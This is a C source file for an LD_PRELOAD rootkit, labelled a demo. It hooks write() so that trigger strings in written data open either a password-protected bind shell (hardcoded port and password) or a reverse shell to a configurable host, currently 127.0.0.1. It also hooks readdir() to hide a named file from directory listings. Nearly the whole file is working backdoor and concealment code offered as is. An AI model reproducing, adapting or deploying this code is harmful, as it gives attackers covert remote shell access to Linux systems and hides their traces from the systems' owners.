#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include <arpa/inet.h>

// Backdoor definitions
#define BACKDOOR_TRIGGER "backdoor"
#define BACKDOOR_PASS "doorknob" // Backdoor password
#define BACKDOOR_PORT 65065

// Reverse shell definitions
#define REVERSE_TRIGGER "reverseshell4"
#define REM_HOST "127.0.0.1" 
#define REM_PORT 443         

// Hidden file to demonstrate directory hiding
#define HIDDEN_FILE "secret.txt"

// Function pointer declarations for original system calls
ssize_t (*original_write)(int, const void *, size_t);
struct dirent *(*original_readdir)(DIR *);

// Backdoor function: Spawn a shell when triggered
void spawn_backdoor_shell() {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(BACKDOOR_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[DEBUG] Socket creation failed for backdoor");
        return;
    }
    const int optval = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[DEBUG] Bind failed for backdoor");
        close(sockfd);
        return;
    }
    listen(sockfd, 1);

    int client_fd = accept(sockfd, NULL, NULL);
    if (client_fd < 0) {
        perror("[DEBUG] Accept failed for backdoor");
        close(sockfd);
        return;
    }

    char input[50];
    read(client_fd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;

    if (strcmp(input, BACKDOOR_PASS) == 0) {
        for (int i = 0; i < 3; i++) {
            dup2(client_fd, i);
        }
        execve("/bin/sh", NULL, NULL);
    } else {
        shutdown(client_fd, SHUT_RDWR);
    }

    close(sockfd);
}

// Reverse shell function
void spawn_reverse_shell() {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    if (inet_pton(AF_INET, REM_HOST, &addr.sin_addr) <= 0) {
        perror("[DEBUG] Invalid remote host");
        return;
    }

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[DEBUG] Socket creation failed for reverse shell");
        return;
    }

    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        printf("[DEBUG] Reverse shell connected successfully!\n");
        fflush(stdout);
        for (int i = 0; i < 3; i++) {
            dup2(sockfd, i);
        }
        execve("/bin/sh", NULL, NULL);
    } else {
        perror("[DEBUG] Reverse shell connection failed");
    }

    close(sockfd);
}

// Hooked write() function: Trigger backdoor or reverse shell
ssize_t write(int fd, const void *buf, size_t count) {
    // Load the original write function
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
        if (!original_write) {
            perror("[DEBUG] Failed to load original write function");
            return -1;
        }
    }

    printf("[DEBUG] write() called with buf: %s\n", (char *)buf);
    fflush(stdout);

    if (strstr((char *)buf, BACKDOOR_TRIGGER)) {
        printf("[DEBUG] Backdoor trigger detected!\n");
        fflush(stdout);
        spawn_backdoor_shell();
    }

    if (strstr((char *)buf, REVERSE_TRIGGER)) {
        printf("[DEBUG] Reverse shell trigger detected!\n");
        fflush(stdout);
        spawn_reverse_shell();
    }

    return original_write(fd, buf, count);
}

// Hooked readdir() function: Hide specific files
struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir"); // Load the original readdir()
        if (!original_readdir) {
            perror("[DEBUG] Failed to load original readdir function");
            return NULL;
        }
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        // Check if the current file matches the one you want to hide
        if (strcmp(entry->d_name, HIDDEN_FILE) == 0) {
            continue; // Skip this entry, effectively hiding it
        }
        return entry; // Return other entries as normal
    }
    return NULL; // End of directory
}

// Demonstration entry point
__attribute__((constructor)) void init() {
    printf("[LD_PRELOAD DEMO] Malicious shared library loaded!\n");
}
